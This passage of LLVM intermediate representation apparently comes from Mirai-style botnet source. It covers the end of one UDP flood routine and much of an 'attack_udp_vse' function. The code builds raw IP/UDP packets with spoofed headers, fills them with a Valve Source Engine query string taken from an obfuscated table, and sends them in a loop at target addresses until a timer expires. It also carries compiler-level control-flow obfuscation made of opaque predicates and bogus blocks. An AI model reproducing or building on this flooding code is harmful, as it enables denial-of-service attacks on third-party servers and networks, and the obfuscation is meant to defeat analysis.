  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %515, i64 %517
  %519 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %518, i32 0, i32 0
  %520 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %519, i32 0, i32 1
  store i16 %514, i16* %520, align 2
  %521 = load i32, i32* %12, align 4
  %522 = load i8*, i8** %26, align 8
  %523 = load i16, i16* %20, align 2
  %524 = zext i16 %523 to i64
  %525 = add i64 28, %524
  %526 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %527 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %528 = load i32, i32* %11, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %527, i64 %529
  %531 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %530, i32 0, i32 0
  %532 = bitcast %struct.sockaddr_in* %531 to %struct.sockaddr*
  store %struct.sockaddr* %532, %struct.sockaddr** %526, align 8
  %533 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %534 = load %struct.sockaddr*, %struct.sockaddr** %533, align 8
  %535 = call i64 @sendto(i32 %521, i8* %522, i64 %525, i32 16384, %struct.sockaddr* %534, i32 16)
  %536 = load i32, i32* @x.29
  %537 = load i32, i32* @y.30
  %538 = sub i32 %536, 1
  %539 = mul i32 %536, %538
  %540 = urem i32 %539, 2
  %541 = icmp eq i32 %540, 0
  %542 = icmp slt i32 %537, 10
  %543 = or i1 %541, %542
  br i1 %543, label %originalBBpart2105, label %originalBB88alteredBB

originalBBpart2105:                               ; preds = %originalBB88
  br label %544

; <label>:544:                                    ; preds = %originalBBpart2105
  %545 = load i32, i32* %11, align 4
  %546 = add nsw i32 %545, 1
  store i32 %546, i32* %11, align 4
  br label %308

; <label>:547:                                    ; preds = %308
  %548 = call i64 @time(i64* null) #6
  %549 = load i32, i32* %23, align 4
  %550 = sext i32 %549 to i64
  %551 = icmp sgt i64 %548, %550
  br i1 %551, label %552, label %569

; <label>:552:                                    ; preds = %547
  %553 = load i32, i32* @x.29
  %554 = load i32, i32* @y.30
  %555 = sub i32 %553, 1
  %556 = mul i32 %553, %555
  %557 = urem i32 %556, 2
  %558 = icmp eq i32 %557, 0
  %559 = icmp slt i32 %554, 10
  %560 = or i1 %558, %559
  br i1 %560, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %552
  %561 = load i32, i32* @x.29
  %562 = load i32, i32* @y.30
  %563 = sub i32 %561, 1
  %564 = mul i32 %561, %563
  %565 = urem i32 %564, 2
  %566 = icmp eq i32 %565, 0
  %567 = icmp slt i32 %562, 10
  %568 = or i1 %566, %567
  br i1 %568, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br label %570

; <label>:569:                                    ; preds = %547
  br label %307

; <label>:570:                                    ; preds = %originalBBpart2109, %originalBBpart212, %originalBBpart28
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %79
  store i16 1460, i16* %20, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %96
  %571 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %571, i32* %12, align 4
  %572 = icmp eq i32 %571, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %115
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %137
  %573 = load i32, i32* %12, align 4
  %574 = call i32 @close(i32 %573)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %156
  store i32 0, i32* %11, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %178
  %575 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %576 = load i8**, i8*** %13, align 8
  %577 = load i32, i32* %11, align 4
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds i8*, i8** %576, i64 %578
  store i8* %575, i8** %579, align 8
  %580 = load i8**, i8*** %13, align 8
  %581 = load i32, i32* %11, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds i8*, i8** %580, i64 %582
  %584 = load i8*, i8** %583, align 8
  %585 = bitcast i8* %584 to %struct.iphdr*
  store %struct.iphdr* %585, %struct.iphdr** %24, align 8
  %586 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %587 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %586, i64 1
  %588 = bitcast %struct.iphdr* %587 to %struct.udphdr*
  store %struct.udphdr* %588, %struct.udphdr** %25, align 8
  %589 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %590 = bitcast %struct.iphdr* %589 to i8*
  %591 = load i8, i8* %590, align 4
  %_ = sub i8 0, %591
  %gen = add i8 %_, 15
  %_19 = shl i8 %591, 15
  %592 = and i8 %591, 15
  %_20 = shl i8 %592, 64
  %_21 = shl i8 %592, 64
  %_22 = sub i8 0, %592
  %gen23 = add i8 %_22, 64
  %_24 = shl i8 %592, 64
  %_25 = sub i8 %592, 64
  %gen26 = mul i8 %_25, 64
  %_27 = sub i8 %592, 64
  %gen28 = mul i8 %_27, 64
  %_29 = sub i8 %592, 64
  %gen30 = mul i8 %_29, 64
  %593 = or i8 %592, 64
  store i8 %593, i8* %590, align 4
  %594 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %595 = bitcast %struct.iphdr* %594 to i8*
  %596 = load i8, i8* %595, align 4
  %_31 = shl i8 %596, -16
  %597 = and i8 %596, -16
  %598 = or i8 %597, 5
  store i8 %598, i8* %595, align 4
  %599 = load i8, i8* %14, align 1
  %600 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %601 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %600, i32 0, i32 1
  store i8 %599, i8* %601, align 1
  %602 = load i16, i16* %20, align 2
  %603 = zext i16 %602 to i64
  %_32 = sub i64 0, 28
  %gen33 = add i64 %_32, %603
  %_34 = sub i64 28, %603
  %gen35 = mul i64 %_34, %603
  %_36 = sub i64 0, 28
  %gen37 = add i64 %_36, %603
  %_38 = sub i64 28, %603
  %gen39 = mul i64 %_38, %603
  %_40 = sub i64 0, 28
  %gen41 = add i64 %_40, %603
  %_42 = sub i64 0, 28
  %gen43 = add i64 %_42, %603
  %_44 = sub i64 0, 28
  %gen45 = add i64 %_44, %603
  %_46 = shl i64 28, %603
  %604 = add i64 28, %603
  %605 = trunc i64 %604 to i16
  %606 = call zeroext i16 @htons(i16 zeroext %605) #7
  %607 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %608 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %607, i32 0, i32 2
  store i16 %606, i16* %608, align 2
  %609 = load i16, i16* %15, align 2
  %610 = call zeroext i16 @htons(i16 zeroext %609) #7
  %611 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %612 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %611, i32 0, i32 3
  store i16 %610, i16* %612, align 4
  %613 = load i8, i8* %16, align 1
  %614 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %615 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %614, i32 0, i32 5
  store i8 %613, i8* %615, align 4
  %616 = load i8, i8* %17, align 1
  %617 = icmp ne i8 %616, 0
  br label %originalBB18

originalBB50alteredBB:                            ; preds = %originalBB50, %238
  %618 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %619 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %620 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %619, i32 0, i32 4
  store i16 %618, i16* %620, align 2
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %287
  %621 = load i32, i32* %11, align 4
  %_55 = shl i32 %621, 1
  %622 = add nsw i32 %621, 1
  store i32 %622, i32* %11, align 4
  br label %originalBB54

originalBB59alteredBB:                            ; preds = %originalBB59, %335
  %623 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %624 = load i32, i32* %11, align 4
  %625 = sext i32 %624 to i64
  %626 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %623, i64 %625
  %627 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %626, i32 0, i32 1
  %628 = load i32, i32* %627, align 4
  %629 = call i32 @ntohl(i32 %628) #7
  %630 = call i32 @rand_next()
  %631 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %632 = load i32, i32* %11, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %631, i64 %633
  %635 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %634, i32 0, i32 2
  %636 = load i8, i8* %635, align 4
  %637 = zext i8 %636 to i32
  %_60 = sub i32 0, %630
  %gen61 = add i32 %_60, %637
  %_62 = sub i32 %630, %637
  %gen63 = mul i32 %_62, %637
  %_64 = shl i32 %630, %637
  %638 = lshr i32 %630, %637
  %_65 = sub i32 %629, %638
  %gen66 = mul i32 %_65, %638
  %_67 = sub i32 %629, %638
  %gen68 = mul i32 %_67, %638
  %639 = add i32 %629, %638
  %640 = call i32 @htonl(i32 %639) #7
  %641 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %642 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %641, i32 0, i32 9
  store i32 %640, i32* %642, align 4
  br label %originalBB59

originalBB72alteredBB:                            ; preds = %originalBB72, %372
  %643 = load i32, i32* %22, align 4
  %644 = icmp eq i32 %643, -1
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %413
  %645 = load i16, i16* %19, align 2
  %646 = zext i16 %645 to i32
  %647 = icmp eq i32 %646, 65535
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %438
  %648 = load i8, i8* %21, align 1
  %649 = icmp ne i8 %648, 0
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %457
  %650 = load i8*, i8** %29, align 8
  %651 = load i16, i16* %20, align 2
  %652 = zext i16 %651 to i32
  call void @rand_alphastr(i8* %650, i32 %652)
  %653 = load i8*, i8** %29, align 8
  %654 = load i16, i16* %20, align 2
  %655 = zext i16 %654 to i64
  %656 = getelementptr inbounds i8, i8* %653, i64 %655
  store i8 0, i8* %656, align 1
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %481
  %657 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %658 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %657, i32 0, i32 7
  store i16 0, i16* %658, align 2
  %659 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %660 = bitcast %struct.iphdr* %659 to i16*
  %661 = call zeroext i16 @checksum_generic(i16* %660, i32 20)
  %662 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %663 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %662, i32 0, i32 7
  store i16 %661, i16* %663, align 2
  %664 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %665 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %664, i32 0, i32 3
  store i16 0, i16* %665, align 2
  %666 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %667 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %668 = bitcast %struct.udphdr* %667 to i8*
  %669 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %670 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %669, i32 0, i32 2
  %671 = load i16, i16* %670, align 2
  %672 = load i16, i16* %20, align 2
  %673 = zext i16 %672 to i64
  %_89 = sub i64 8, %673
  %gen90 = mul i64 %_89, %673
  %_91 = sub i64 0, 8
  %gen92 = add i64 %_91, %673
  %_93 = shl i64 8, %673
  %_94 = sub i64 0, 8
  %gen95 = add i64 %_94, %673
  %_96 = sub i64 0, 8
  %gen97 = add i64 %_96, %673
  %_98 = shl i64 8, %673
  %674 = add i64 8, %673
  %675 = trunc i64 %674 to i32
  %676 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %666, i8* %668, i16 zeroext %671, i32 %675)
  %677 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %678 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %677, i32 0, i32 3
  store i16 %676, i16* %678, align 2
  %679 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %680 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %679, i32 0, i32 1
  %681 = load i16, i16* %680, align 2
  %682 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %683 = load i32, i32* %11, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %682, i64 %684
  %686 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %685, i32 0, i32 0
  %687 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %686, i32 0, i32 1
  store i16 %681, i16* %687, align 2
  %688 = load i32, i32* %12, align 4
  %689 = load i8*, i8** %26, align 8
  %690 = load i16, i16* %20, align 2
  %691 = zext i16 %690 to i64
  %_99 = sub i64 28, %691
  %gen100 = mul i64 %_99, %691
  %_101 = sub i64 0, 28
  %gen102 = add i64 %_101, %691
  %_103 = shl i64 28, %691
  %692 = add i64 28, %691
  %693 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %694 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %695 = load i32, i32* %11, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %694, i64 %696
  %698 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %697, i32 0, i32 0
  %699 = bitcast %struct.sockaddr_in* %698 to %struct.sockaddr*
  store %struct.sockaddr* %699, %struct.sockaddr** %693, align 8
  %700 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %701 = load %struct.sockaddr*, %struct.sockaddr** %700, align 8
  %702 = call i64 @sendto(i32 %688, i8* %689, i64 %692, i32 16384, %struct.sockaddr* %701, i32 16)
  br label %originalBB88

originalBB107alteredBB:                           ; preds = %originalBB107, %552
  br label %originalBB107
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 8) #6
  %33 = bitcast i8* %32 to i8**
  store i8** %33, i8*** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 2, i32 0)
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %14, align 1
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 3, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 4, i32 64)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %16, align 1
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 5, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = load i8, i8* %9, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 6, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %18, align 2
  %54 = load i8, i8* %9, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 7, i32 27015)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %19, align 2
  store i32 0, i32* %21, align 4
  %58 = call i64 @time(i64* null) #6
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = add nsw i64 %58, %60
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %22, align 4
  call void @table_unlock_val(i8 zeroext 36)
  %63 = call i8* @table_retrieve_val(i32 36, i32* %21)
  store i8* %63, i8** %20, align 8
  %64 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %64, i32* %12, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %5
  br label %382

; <label>:67:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %68 = load i32, i32* %12, align 4
  %69 = bitcast i32* %11 to i8*
  %70 = call i32 @setsockopt(i32 %68, i32 0, i32 3, i8* %69, i32 4) #6
  %71 = icmp eq i32 %70, -1
  br i1 %71, label %72, label %75

; <label>:72:                                     ; preds = %67
  %73 = load i32, i32* %12, align 4
  %74 = call i32 @close(i32 %73)
  br label %382

; <label>:75:                                     ; preds = %67
  %76 = load i32, i32* @x.31
  %77 = load i32, i32* @y.32
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %75
  store i32 0, i32* %11, align 4
  %84 = load i32, i32* @x.31
  %85 = load i32, i32* @y.32
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %92

; <label>:92:                                     ; preds = %216, %originalBBpart2
  %93 = load i32, i32* @x.31
  %94 = load i32, i32* @y.32
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %92
  %101 = load i32, i32* %11, align 4
  %102 = load i8, i8* %7, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp slt i32 %101, %103
  %105 = load i32, i32* @x.31
  %106 = load i32, i32* @y.32
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %104, label %113, label %219

; <label>:113:                                    ; preds = %originalBBpart24
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %13, align 8
  %120 = load i32, i32* %11, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %23, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.udphdr*
  store %struct.udphdr* %127, %struct.udphdr** %24, align 8
  %128 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %129 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %128, i64 1
  %130 = bitcast %struct.udphdr* %129 to i8*
  store i8* %130, i8** %25, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = and i8 %133, 15
  %135 = or i8 %134, 64
  store i8 %135, i8* %132, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %137 = bitcast %struct.iphdr* %136 to i8*
  %138 = load i8, i8* %137, align 4
  %139 = and i8 %138, -16
  %140 = or i8 %139, 5
  store i8 %140, i8* %137, align 4
  %141 = load i8, i8* %14, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 1
  store i8 %141, i8* %143, align 1
  %144 = load i32, i32* %21, align 4
  %145 = sext i32 %144 to i64
  %146 = add i64 32, %145
  %147 = trunc i64 %146 to i16
  %148 = call zeroext i16 @htons(i16 zeroext %147) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 2
  store i16 %148, i16* %150, align 2
  %151 = load i16, i16* %15, align 2
  %152 = call zeroext i16 @htons(i16 zeroext %151) #7
  %153 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 3
  store i16 %152, i16* %154, align 4
  %155 = load i8, i8* %16, align 1
  %156 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 5
  store i8 %155, i8* %157, align 4
  %158 = load i8, i8* %17, align 1
  %159 = icmp ne i8 %158, 0
  br i1 %159, label %160, label %180

; <label>:160:                                    ; preds = %113
  %161 = load i32, i32* @x.31
  %162 = load i32, i32* @y.32
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %160
  %169 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %170 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 4
  store i16 %169, i16* %171, align 2
  %172 = load i32, i32* @x.31
  %173 = load i32, i32* @y.32
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %180

; <label>:180:                                    ; preds = %originalBBpart28, %113
  %181 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 6
  store i8 17, i8* %182, align 1
  %183 = load i32, i32* @LOCAL_ADDR, align 4
  %184 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 8
  store i32 %183, i32* %185, align 4
  %186 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %187 = load i32, i32* %11, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i32 0, i32 1
  %191 = load i32, i32* %190, align 4
  %192 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 9
  store i32 %191, i32* %193, align 4
  %194 = load i16, i16* %18, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %197 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %196, i32 0, i32 0
  store i16 %195, i16* %197, align 2
  %198 = load i16, i16* %19, align 2
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %201 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %200, i32 0, i32 1
  store i16 %199, i16* %201, align 2
  %202 = load i32, i32* %21, align 4
  %203 = sext i32 %202 to i64
  %204 = add i64 12, %203
  %205 = trunc i64 %204 to i16
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %208 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %207, i32 0, i32 2
  store i16 %206, i16* %208, align 2
  %209 = load i8*, i8** %25, align 8
  %210 = bitcast i8* %209 to i32*
  store i32 -1, i32* %210, align 4
  %211 = load i8*, i8** %25, align 8
  %212 = getelementptr inbounds i8, i8* %211, i64 4
  store i8* %212, i8** %25, align 8
  %213 = load i8*, i8** %25, align 8
  %214 = load i8*, i8** %20, align 8
  %215 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %213, i8* %214, i32 %215)
  br label %216

; <label>:216:                                    ; preds = %180
  %217 = load i32, i32* %11, align 4
  %218 = add nsw i32 %217, 1
  store i32 %218, i32* %11, align 4
  br label %92

; <label>:219:                                    ; preds = %originalBBpart24
  br label %220

; <label>:220:                                    ; preds = %originalBBpart216, %219
  store i32 0, i32* %11, align 4
  br label %221

; <label>:221:                                    ; preds = %356, %220
  %222 = load i32, i32* %11, align 4
  %223 = load i8, i8* %7, align 1
  %224 = zext i8 %223 to i32
  %225 = icmp slt i32 %222, %224
  br i1 %225, label %226, label %359

; <label>:226:                                    ; preds = %221
  %227 = load i8**, i8*** %13, align 8
  %228 = load i32, i32* %11, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds i8*, i8** %227, i64 %229
  %231 = load i8*, i8** %230, align 8
  store i8* %231, i8** %26, align 8
  %232 = load i8*, i8** %26, align 8
  %233 = bitcast i8* %232 to %struct.iphdr*
  store %struct.iphdr* %233, %struct.iphdr** %27, align 8
  %234 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i64 1
  %236 = bitcast %struct.iphdr* %235 to %struct.udphdr*
  store %struct.udphdr* %236, %struct.udphdr** %28, align 8
  %237 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %238 = load i32, i32* %11, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %237, i64 %239
  %241 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %240, i32 0, i32 2
  %242 = load i8, i8* %241, align 4
  %243 = zext i8 %242 to i32
  %244 = icmp slt i32 %243, 32
  br i1 %244, label %245, label %266

; <label>:245:                                    ; preds = %226
  %246 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %247 = load i32, i32* %11, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %246, i64 %248
  %250 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %249, i32 0, i32 1
  %251 = load i32, i32* %250, align 4
  %252 = call i32 @ntohl(i32 %251) #7
  %253 = call i32 @rand_next()
  %254 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %255 = load i32, i32* %11, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %254, i64 %256
  %258 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %257, i32 0, i32 2
  %259 = load i8, i8* %258, align 4
  %260 = zext i8 %259 to i32
  %261 = lshr i32 %253, %260
  %262 = add i32 %252, %261
  %263 = call i32 @htonl(i32 %262) #7
  %264 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 9
  store i32 %263, i32* %265, align 4
  br label %266

; <label>:266:                                    ; preds = %245, %226
  %267 = load i32, i32* @x.31
  %268 = load i32, i32* @y.32
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
